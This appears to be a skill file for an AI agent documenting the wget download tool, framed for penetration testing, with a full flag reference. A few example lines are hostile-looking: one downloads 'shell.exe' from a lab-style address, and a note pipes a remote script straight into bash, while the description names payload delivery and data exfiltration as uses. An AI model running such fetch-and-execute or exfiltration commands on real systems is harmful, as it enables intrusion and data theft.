---
name: wget
description: Retrieve files from the web using HTTP(S) and FTP. Use when downloading payloads, mirroring websites, performing web reconnaissance, exfiltrating data, or automating file retrieval during penetration testing and post-exploitation.
---

# wget

## Overview
Wget is a non-interactive network utility for retrieving files using HTTP, HTTPS, and FTP. It supports recursive downloading, mirroring, and resuming partial downloads. It is a core tool for information gathering, exploitation, and post-exploitation tasks.

## Installation (if not already installed)
Assume wget is already installed. If missing:
```bash
sudo apt install wget
```

## Common Workflows

### Download a single file and rename it
```bash
wget -O payload.exe http://10.10.10.10/shell.exe
```

### Mirror a website for offline analysis
```bash
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.com
```

### Resume a failed large download
```bash
wget -c http://example.com/large-file.iso
```

### Download a list of URLs from a file
```bash
wget -i targets.txt
```

### Send data via POST request
```bash
wget --post-data="user=admin&pass=1234" http://example.com/login
```

## Complete Command Reference

### Startup
| Flag | Description |
|------|-------------|
| `-V, --version` | Display version and exit |
| `-h, --help` | Print help message |
| `-b, --background` | Go to background after startup |
| `-e, --execute=COMMAND` | Execute a `.wgetrc`-style command |

### Logging and Input File
| Flag | Description |
|------|-------------|
| `-o, --output-file=FILE` | Log messages to FILE |
| `-a, --append-output=FILE` | Append messages to FILE |
| `-d, --debug` | Print debugging information |
| `-q, --quiet` | Quiet mode (no output) |
| `-v, --verbose` | Verbose output (default) |
| `-nv, --no-verbose` | Turn off verboseness without being quiet |
| `--report-speed=TYPE` | Output bandwidth as TYPE (e.g., bits) |
| `-i, --input-file=FILE` | Download URLs found in local or external FILE |
| `-F, --force-html` | Treat input file as HTML |
| `-B, --base=URL` | Resolves HTML input-file links relative to URL |
| `--config=FILE` | Specify config file to use |
| `--no-config` | Do not read any config file |
| `--rejected-log=FILE` | Log reasons for URL rejection to FILE |

### Download Options
| Flag | Description |
|------|-------------|
| `-t, --tries=NUMBER` | Set number of retries (0 for unlimits) |
| `--retry-connrefused` | Retry even if connection is refused |
| `--retry-on-host-error` | Consider host errors as non-fatal |
| `--retry-on-http-error=ERRORS` | Comma-separated list of HTTP errors to retry |
| `-O, --output-document=FILE` | Write documents to FILE |
| `-nc, --no-clobber` | Skip downloads that would overwrite existing files |
| `--no-netrc` | Don't obtain credentials from .netrc |
| `-c, --continue` | Resume getting a partially-downloaded file |
| `--start-pos=OFFSET` | Start downloading from zero-based position OFFSET |
| `--progress=TYPE` | Select progress gauge type |
| `--show-progress` | Display progress bar in any verbosity mode |
| `-N, --timestamping` | Don't re-retrieve files unless newer than local |
| `--no-if-modified-since` | Don't use conditional if-modified-since requests |
| `--no-use-server-timestamps` | Don't set local file timestamp from server |
| `-S, --server-response` | Print server response |
| `--spider` | Don't download anything (check if file exists) |
| `-T, --timeout=SECONDS` | Set all timeout values to SECONDS |
| `--dns-timeout=SECS` | Set DNS lookup timeout |
| `--connect-timeout=SECS` | Set connect timeout |
| `--read-timeout=SECS` | Set read timeout |
| `-w, --wait=SECONDS` | Wait SECONDS between retrievals |
| `--waitretry=SECONDS` | Wait 1..SECONDS between retries |
| `--random-wait` | Wait 0.5 to 1.5 * WAIT secs between retrievals |
| `--no-proxy` | Explicitly turn off proxy |
| `-Q, --quota=NUMBER` | Set retrieval quota to NUMBER |
| `--bind-address=ADDRESS` | Bind to ADDRESS on local host |
| `--limit-rate=RATE` | Limit download rate to RATE |
| `--no-dns-cache` | Disable caching DNS lookups |
| `--restrict-file-names=OS` | Restrict chars in file names to ones OS allows |
| `--ignore-case` | Ignore case when matching files/directories |
| `-4, --inet4-only` | Connect only to IPv4 addresses |
| `-6, --inet6-only` | Connect only to IPv6 addresses |
| `--prefer-family=FAMILY` | Connect first to IPv6, IPv4, or none |
| `--user=USER` | Set both FTP and HTTP user |
| `--password=PASS` | Set both FTP and HTTP password |
| `--ask-password` | Prompt for passwords |
| `--use-askpass=COMMAND` | Specify credential handler for username/password |
| `--no-iri` | Turn off IRI support |
| `--local-encoding=ENC` | Use ENC as local encoding for IRIs |
| `--remote-encoding=ENC` | Use ENC as default remote encoding |
| `--unlink` | Remove file before clobber |
| `--xattr` | Store metadata in extended file attributes |

### Directory Options
| Flag | Description |
|------|-------------|
| `-nd, --no-directories` | Don't create directories |
| `-x, --force-directories` | Force creation of directories |
| `-nH, --no-host-directories` | Don't create host directories |
| `--protocol-directories` | Use protocol name in directories |
| `-P, --directory-prefix=PREFIX` | Save files to PREFIX/.. |
| `--cut-dirs=NUMBER` | Ignore NUMBER remote directory components |

### HTTP Options
| Flag | Description |
|------|-------------|
| `--http-user=USER` | Set HTTP user |
| `--http-password=PASS` | Set HTTP password |
| `--no-cache` | Disallow server-cached data |
| `--default-page=NAME` | Change default page name (default: index.html) |
| `-E, --adjust-extension` | Save HTML/CSS with proper extensions |
| `--ignore-length` | Ignore 'Content-Length' header field |
| `--header=STRING` | Insert STRING among the headers |
| `--compression=TYPE` | Choose compression: auto, gzip, none |
| `--max-redirect` | Maximum redirections allowed per page |
| `--proxy-user=USER` | Set proxy username |
| `--proxy-password=PASS` | Set proxy password |
| `--referer=URL` | Include 'Referer: URL' header |
| `--save-headers` | Save HTTP headers to file |
| `-U, --user-agent=AGENT` | Identify as AGENT instead of Wget/VERSION |
| `--no-http-keep-alive` | Disable HTTP keep-alive |
| `--no-cookies` | Don't use cookies |
| `--load-cookies=FILE` | Load cookies from FILE |
| `--save-cookies=FILE` | Save cookies to FILE |
| `--keep-session-cookies` | Load and save session (non-permanent) cookies |
| `--post-data=STRING` | Use POST method; send STRING as data |
| `--post-file=FILE` | Use POST method; send contents of FILE |
| `--method=HTTPMethod` | Use specific HTTP method (e.g., PUT, DELETE) |
| `--body-data=STRING` | Send STRING as data (requires --method) |
| `--body-file=FILE` | Send contents of FILE (requires --method) |
| `--content-disposition` | Honor Content-Disposition header for filenames |
| `--content-on-error` | Output received content even on server errors |
| `--auth-no-challenge` | Send Basic Auth without waiting for challenge |

### HTTPS (SSL/TLS) Options
| Flag | Description |
|------|-------------|
| `--secure-protocol=PR` | Choose protocol: auto, SSLv2, SSLv3, TLSv1, TLSv1_1, TLSv1_2, TLSv1_3, PFS |
| `--https-only` | Only follow secure HTTPS links |
| `--no-check-certificate` | Don't validate the server's certificate |
| `--certificate=FILE` | Client certificate file |
| `--certificate-type=TYPE` | Client certificate type (PEM or DER) |
| `--private-key=FILE` | Private key file |
| `--private-key-type=TYPE` | Private key type (PEM or DER) |
| `--ca-certificate=FILE` | File with bundle of CAs |
| `--ca-directory=DIR` | Directory with hash list of CAs |
| `--crl-file=FILE` | File with bundle of CRLs |
| `--pinnedpubkey=FILE/HASHES` | Verify peer against public key file or sha256 hashes |
| `--ciphers=STR` | Set priority string (GnuTLS) or cipher list (OpenSSL) |

### HSTS Options
| Flag | Description |
|------|-------------|
| `--no-hsts` | Disable HSTS |
| `--hsts-file` | Path of HSTS database |

### FTP Options
| Flag | Description |
|------|-------------|
| `--ftp-user=USER` | Set FTP user |
| `--ftp-password=PASS` | Set FTP password |
| `--no-remove-listing` | Don't remove '.listing' files |
| `--no-glob` | Turn off FTP file name globbing |
| `--no-passive-ftp` | Disable passive transfer mode |
| `--preserve-permissions` | Preserve remote file permissions |
| `--retr-symlinks` | Get linked-to files during recursion |

### FTPS Options
| Flag | Description |
|------|-------------|
| `--ftps-implicit` | Use implicit FTPS (port 990) |
| `--ftps-resume-ssl` | Resume SSL/TLS session for data connection |
| `--ftps-clear-data-connection` | Cipher control channel only; data in plaintext |
| `--ftps-fallback-to-ftp` | Fall back to FTP if FTPS is unsupported |

### WARC Options
| Flag | Description |
|------|-------------|
| `--warc-file=FILENAME` | Save request/response data to .warc.gz file |
| `--warc-header=STRING` | Insert STRING into warcinfo record |
| `--warc-max-size=NUMBER` | Set maximum size of WARC files |
| `--warc-cdx` | Write CDX index files |
| `--warc-dedup=FILENAME` | Do not store records listed in this CDX file |
| `--no-warc-compression` | Do not compress WARC files |
| `--no-warc-digests` | Do not calculate SHA1 digests |
| `--no-warc-keep-log` | Do not store log file in WARC record |
| `--warc-tempdir=DIRECTORY` | Location for temporary WARC files |

### Recursive Download
| Flag | Description |
|------|-------------|
| `-r, --recursive` | Specify recursive download |
| `-l, --level=NUMBER` | Maximum recursion depth (0 or inf for infinite) |
| `--delete-after` | Delete files locally after downloading them |
| `-k, --convert-links` | Make links in HTML/CSS point to local files |
| `--convert-file-only` | Convert only the file part of URLs |
| `--backups=N` | Rotate up to N backup files |
| `-K, --backup-converted` | Back up file as X.orig before converting |
| `-m, --mirror` | Shortcut for `-N -r -l inf --no-remove-listing` |
| `-p, --page-requisites` | Get all images/assets needed to display HTML page |
| `--strict-comments` | Turn on strict SGML handling of HTML comments |

### Recursive Accept/Reject
| Flag | Description |
|------|-------------|
| `-A, --accept=LIST` | Comma-separated list of accepted extensions |
| `-R, --reject=LIST` | Comma-separated list of rejected extensions |
| `--accept-regex=REGEX` | Regex matching accepted URLs |
| `--reject-regex=REGEX` | Regex matching rejected URLs |
| `--regex-type=TYPE` | Regex type (posix or pcre) |
| `-D, --domains=LIST` | Comma-separated list of accepted domains |
| `--exclude-domains=LIST` | Comma-separated list of rejected domains |
| `--follow-ftp` | Follow FTP links from HTML documents |
| `--follow-tags=LIST` | Comma-separated list of followed HTML tags |
| `--ignore-tags=LIST` | Comma-separated list of ignored HTML tags |
| `-H, --span-hosts` | Go to foreign hosts when recursive |
| `-L, --relative` | Follow relative links only |
| `-I, --include-directories=LIST` | List of allowed directories |
| `--trust-server-names` | Use name from redirection URL's last component |
| `-X, --exclude-directories=LIST` | List of excluded directories |
| `-np, --no-parent` | Don't ascend to the parent directory |

## Notes
- Use `--no-check-certificate` when interacting with internal servers using self-signed certificates.
- The `-O -` (dash) option can be used to pipe the downloaded content directly to another command (e.g., `wget -O - http://site.com/script.sh | bash`).
- Be cautious with `--mirror` on large sites as it can consume significant disk space and bandwidth.